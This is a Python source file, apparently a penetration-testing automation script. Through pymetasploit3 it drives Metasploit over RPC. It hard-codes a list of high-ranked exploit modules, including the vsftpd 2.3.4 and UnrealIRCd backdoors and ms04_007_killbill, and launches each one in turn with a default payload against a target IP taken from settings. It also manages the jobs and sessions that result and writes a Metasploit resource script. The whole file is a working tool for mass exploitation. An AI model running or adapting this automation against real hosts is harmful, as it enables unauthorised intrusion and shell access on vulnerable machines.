import time
import sys
import json
import os
from pymetasploit3.msfrpc import JobManager
from rc_module import generate_resource_script
from base import settings


# excellentExplotis = []
excellentExplotis = ['unix/ftp/vsftpd_234_backdoor','windows/fileformat/activepdf_webgrabber','exploit/unix/irc/unreal_ircd_3281_backdoor', 'windows/fileformat/djvu_imageurl', 'windows/fileformat/mcafee_hercules_deletesnapshot', 'windows/fileformat/msworks_wkspictureinterface', 'windows/fileformat/sascam_get', 'windows/smb/ms04_007_killbill', 'windows/ftp/sami_ftpd_list','unix/misc/spamassassin_exec']
greatExploits = []
goodExploits = []
normalExploits = []
averageExploits = []
lowExploits = []
manualExplots = []
rc_commands = []

def main():
    print('exploit module')
# This line runs the main function
if __name__ == "__main__":
    main()
def exploit(client):
    jobs = JobManager(client)
    exploitlist = client.modules.exploits
    print('Exploit Module..')
    while True:
        print('press [1] to show current exploit list')
        print('press [2] to fetch excellent rank exploit')
        print('press [3] to run all exploit in exploit list')
        print('press [4] to check running jobs')
        print('press [5] to stop running jobs')
        print('press [6] to check running sessions')
        print('press [7] to stop running sessions')
        print('press [8] to generate resource script')
        print('press [0] to go back')
        command = input('Input Exploit Command Here: ')
        if (command == '1'):
            # 1 show current exploit list
            os.system('cls' if os.name == 'nt' else 'clear')
            print(excellentExplotis)
        elif (command == '2'):
            # 2 extract exploit
            os.system('cls' if os.name == 'nt' else 'clear') 
            exploit_list_extract(client,exploitlist)
        elif (command == '3'):
            # 3 run exploit
            os.system('cls' if os.name == 'nt' else 'clear')
            execute_exploit(client,jobs)
        elif (command == '4'):
            # 4 check jobs
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{len(jobs.list)} job(s) running' )
            print(jobs.list)
        elif command == '5':
            # 5 stop jobs
            os.system('cls' if os.name == 'nt' else 'clear')
            print('stopping jobs..')
            for j in jobs.list:
                print('stopping job ' + j+ ' ' + jobs.list[j])
                jobs.stop(jobid=j)
            print(''+ str(len(jobs.list)) +' jobs left..')
        elif command == '6':
            # 6 check sessions
            os.system('cls' if os.name == 'nt' else 'clear')
            print(f'{len(client.sessions.list)} session(s) running' )
            print(client.sessions.list)
        elif command == '7':
            # 7 stop sessions
            os.system('cls' if os.name == 'nt' else 'clear')
            print("stop all session avaiables : ")
            for s in client.sessions.list.keys():
                print(s)
                shell = client.sessions.session(s)
                shell.stop()
            time.sleep(2)
            print(json.dumps(client.sessions.list,indent=4,sort_keys=True))
        elif command == '8':
            # 8 generate .rc file 
            print('generating rc file...')
            generate_resource_script(rc_commands)
            print('Generate Complete..')
        elif command == '0':
            os.system('cls' if os.name == 'nt' else 'clear')
            break
        else:
            print('Error: Command Not Found..')

def execute_exploit(client,jobs):
    ip_address = settings['target_ip']
    # rc_commands = []
    rc_commands.append('setg RHOST '+ ip_address) # append set global ip in rc file
    rc_commands.append('setg LHOST 127.0.0.1')
    for exploitName in excellentExplotis:
        count = 1
        exploit = client.modules.use('exploit', exploitName)
        rc_commands.append('use exploit/' + exploitName) # append exploit name
        payloadlist = exploit.targetpayloads()
        print(exploitName + ' ' + payloadlist[0])
        rc_commands.append('set PAYLOAD ' + payloadlist[0]) # apppend payload name in rc_command
        # add rhost for exploit that require rhost
        if(exploit.missing_required.count('RHOST') == 1):
            # print(exploitName)
            exploit['RHOST'] = ip_address
        
        try:
            current_job = exploit.execute(payload = payloadlist[0])
            rc_commands.append('run -j')
            while str(current_job['job_id']) in jobs.list.keys() : # wating till the current job in done processing or exceed time limit
                wait_jobs()
                if(count >= int(settings['TTL'])):
                    print('\nThis exploit take too long exit now...')
                    # jj['jobid']
                    jobs.stop(current_job['job_id'])
                    break
                count += 1
            
            if(current_job['job_id'] != None):
                print('Exploit Done\n')
        except:
            print("An exception occurred")

    print( f'{len(client.sessions.list)} Sessions avaiables ')
    # for s in client.sessions.list.keys():
    #     print(s)
        
    # print(json.dumps(client.sessions.list,indent=4,sort_keys=True))

def exploit_list_extract(client,exploitlist):
    for exploit in exploitlist:
        rank = client.modules.use('exploit',exploit).rank
        if(rank == 600): # Excellent modules
            excellentExplotis.append(exploit)
        elif(rank == 500): # great modules
            greatExploits.append(exploit)
        elif(rank == 400): # good modules
            goodExploits.append(exploit)
        elif(rank == 300): # normal modules
            normalExploits.append(exploit)
        elif(rank == 200): # average modules
            averageExploits.append(exploit)
        elif(rank == 100): # low modules
            lowExploits.append(exploit)
        else:
            manualExplots.append(exploit)

def wait_jobs():
    # for i in range(5):
    #     print(".", end="", flush=True)
    #     time.sleep(1)
    # os.system('cls' if os.name == 'nt' else 'clear')
    for i in progressbar(range(15), "Running an Exploit: ", 40):
        time.sleep(0.1)

def progressbar(it, prefix="", size=60, out=sys.stdout): # Python3.3+
    count = len(it)
    def show(j):
        x = int(size*j/count)
        print("{}[{}{}] ".format(prefix, "#"*x, "."*(size-x)), 
                end='\r', file=out, flush=True)
    show(0)
    for i, item in enumerate(it):
        yield item
        show(i+1)
    # print("\n", flush=True, file=out)
